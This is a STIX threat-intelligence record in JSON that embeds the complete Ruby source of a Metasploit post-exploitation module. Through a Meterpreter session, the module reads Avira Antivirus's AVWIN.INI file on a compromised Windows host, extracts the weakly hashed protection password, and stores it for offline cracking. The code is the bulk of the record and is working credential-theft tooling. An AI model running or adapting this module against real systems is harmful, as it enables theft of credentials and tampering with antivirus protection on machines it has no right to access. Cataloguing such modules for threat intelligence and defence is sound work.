{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d68b8cb6-41ba-486d-981e-38c97fdf2760",
    "created": "2024-08-14T16:33:08.761301Z",
    "modified": "2024-08-14T16:33:08.761304Z",
    "name": "Windows Gather Avira Password Extraction",
    "description": " This module extracts the weakly hashed password which is used to protect a Avira Antivirus (<= 15.0.17.273) installation.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/avira_password.rb",
            "external_id": "avira_password.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Avira Password Extraction',\n        'Description' => %q{\n          This module extracts the weakly hashed password\n          which is used to protect a Avira Antivirus (<= 15.0.17.273) installation.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Robert Kugler / robertchrk'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n              stdapi_fs_stat\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def run\n    print_status('Checking default location...')\n    check_programdata('C:\\\\ProgramData\\\\Avira\\\\Antivirus\\\\CONFIG\\\\AVWIN.INI')\n  end\n\n  def check_programdata(path)\n    client.fs.file.stat(path)\n    print_status(\"Found file at #{path}\")\n    get_ini(path)\n  rescue StandardError\n    print_error(\"Error reading or processing #{path}.\")\n  end\n\n  def get_ini(filename)\n    config = client.fs.file.new(filename, 'r')\n    parse = Rex::Text.to_ascii(config.read)\n    ini = Rex::Parser::Ini.from_s(parse)\n\n    if ini == {}\n      print_error('Unable to parse file')\n      return\n    end\n\n    print_status('Processing configuration file...')\n    passwd = ini['COMMON']['Password']\n    passwd = passwd.delete '\"'\n    create_credential({\n      workspace_id: myworkspace_id,\n      origin_type: :session,\n      session_id: session_db_id,\n      post_reference_name: refname,\n      private_type: :nonreplayable_hash,\n      jtr_format: 'Raw-MD5u', # hard coded since hash identifier wont know its unicode\n      private_data: passwd,\n      service_name: 'Avira Antivirus',\n      status: Metasploit::Model::Login::Status::UNTRIED\n    })\n    print_good(\"MD5(Unicode) hash found: #{passwd}\")\n    print_good('Info: Password length is limited to 20 characters.')\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}